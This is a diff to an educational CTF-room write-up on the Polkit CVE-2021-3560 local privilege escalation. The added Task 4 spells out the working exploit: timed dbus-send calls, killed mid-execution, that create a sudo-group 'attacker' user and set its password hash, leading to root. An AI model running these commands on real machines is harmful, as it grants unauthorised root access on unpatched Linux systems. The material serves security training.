@@ -115,7 +115,7 @@ If this doesn't make sense now, hopefully it will after you've had a chance to p
 :~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9f1dd4ab-3348-4475-a3bb-0032dc208764"></p>
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/9f1dd4ab-3348-4475-a3bb-0032dc208764"></p>
 
 
 <br>
@@ -127,11 +127,75 @@ If this doesn't make sense now, hopefully it will after you've had a chance to p
 :~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9b280a62-f4d1-4638-a953-b3810c3d1a26"></p>
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/9b280a62-f4d1-4638-a953-b3810c3d1a26"></p>
 
 <br>
 
 <h2>Task 4 . Tutorial . Exploitation Process</h2>
+<p>We've seen the theory, now let's see it in action!<br>
+
+Let's try to add a new user called <code>attacker</code>, with sudo permissions, and a password of <code>Expl01ted</code>. Just read this information for now -- you will have time to try it in the next task!<br>
+
+First, let's look at the dbus messages we'll need to send:<br>
+
+- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1</code><br><br>
+
+This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker (<code>string:attacker</code>) with a description of "Pentester Account" (<code>string:"Pentester Account"</code>) and membership of the sudo group set to true (referenced by the <code>int32:1</code> flag).<br>
+
+Our second dbus message will set a password for the new account:<br>
+
+- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUSER_ID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester'</code><br><br>
+
+This once again sends a dbus message to the accounts daemon, requesting a password change for the user with an ID which we specify (shown in red), a password hash which we need to generate manually, and a hint ("Ask the pentester")<br><br>
+
+As this is effectively a race condition, we first need to determine how long our command will take to run. Let's try this with the first dbus message:<br>
+- <code>time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1</code>
+
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b3706d8b-990d-4fa8-b9a3-75c55cba2ff"></p>
+
+<p>This takes 0.011 seconds, or 11 milliseconds. This number will be slightly different each time you run the command; however, on the provided machine it should always be around this number.<br>
+
+Note: For the first five minutes or so of deployment the machine is still booting things in the background, so don't be alarmed if the time you get is a lot longer to begin with -- just keep running the command periodically until it gives you a time in a similar region to the results above.<br>
+
+We need to kill the command approximately halfway through execution. Five milliseconds usually works fairly well on the provided machine; however, be aware that this is not an exact thing. You may need to change the sleep time, or run the command several times before it works. That said, once you find a time that works, it should work consistently. If you are struggling to get a working time, putting the command inside a bash for loop and quickly running through a range of times tends to work fairly well.<br>
+
+Let's try this. We need to send the dbus message, then kill it about halfway through:<br>
+
+- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!</code></p>
+
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/d8427170-52c0-497e-b89e-70ee485850d"></p>
+
+<p>To explain the above command, we sent the dbus message in a background job (using the ampersand to background the command). We then told it to sleep for 5 milliseconds (<code>sleep 0.005s</code>), then kill the previous process (<code>$!</code>). This successfully created the new user, adding them into the sudo group.<br>
+We should note down at this point that the user ID of the new user in this instance is 1000.<br><br>
+Now all we need to do is give the user a password and we should be good to go!</p>
+
+
+<br>
+
+
+<p>We need a password hash here, so let's generate a Sha512Crypt hash for our chosen password (<code>Expl01ted</code>code>):<br>
+
+- <code>openssl passwd -6 Expl01ted</code></p>
+
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/38025157-88e7-4b36-971e-1c10ab3af453"></p>
+
+<p>Using openssl, we generate a password of type 6 (SHA512-crypt) and our plaintext password (<code>Expl01ted</code>).<br>
+
+Now let's finish this! 5 milliseconds worked last time, so it should work here too:<br>
+
+- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!</code></p>
+
+<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/c39bd72f-933b-4b55-910e-e8c4a2227d28"></p>
+
+
+<p>With a hop, su, and a <code>sudo -s</code>code>, we have root!</p>
+
+<p><em>Answer the questions below</em></p>
+
+<p>4.1. Read the information above<br>
+<code>No answer needed</p>
+
+<br>
 
 <h2> Task 5 . Practical . Do it yourself!</h2>
 
@@ -145,7 +209,9 @@ If this doesn't make sense now, hopefully it will after you've had a chance to p
 
 <br>
 
-<h2>Task 1 . Info | Deploy</h2>
-<p>Due to the services required to make this vulnerability work, this machine will take up to three minutes to deploy fully. Take the time to read the information in the following tasks before attempting to exploit it.<br>
 
-The exploit detailed in this room would often make use of a GUI desktop. For the sake of speed we will use the CLI. In-browser access is enabled for this machine; however, be aware that copy/paste functionality will only work if you full-screen the target in a browser that is not Firefox. Should you  prefer to SSH in for yourself; credentials for this will be given in the relevant task.</p>
+
+
+```bash
+:~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
+```
